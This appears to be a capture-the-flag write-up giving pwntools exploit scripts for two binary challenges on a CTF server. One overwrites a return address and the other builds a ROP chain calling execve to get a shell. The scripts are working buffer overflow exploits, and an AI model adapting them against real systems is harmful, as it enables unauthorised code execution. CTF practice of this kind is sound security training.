# pwn

## Classic
Sol :
```py
from pwn import *

#p = process('./classic')
p = remote('chall.ycfteam.in','3333')
p.sendline(b'a'*40 +p64(0x0000000000401016)+ p64(0x0000000000401156))

p.interactive()

# for 65 bits we need a retrurn adress  "ROPgadget --binary ./file" will five us one
```
## Gadget
sol :
```py
from pwn import *

elf = context.binary = ELF('main')

io = remote('chall.ycfteam.in','2222')

pop_rax = pack(0x000000000040114c)
pop_rdi = pack(0x000000000040114a)
pop_rsi = pack(0x0000000000401150)
pop_rdx = pack(0x000000000040114e)
syscall = pack(0x0000000000401159)

payload = cyclic(40)+pop_rax + pack(59)+pop_rdi + pack(0x40206d) + pop_rsi + pack(0) + pop_rdx + pack(0)+syscall

io.sendline(payload)

io.interactive()
```
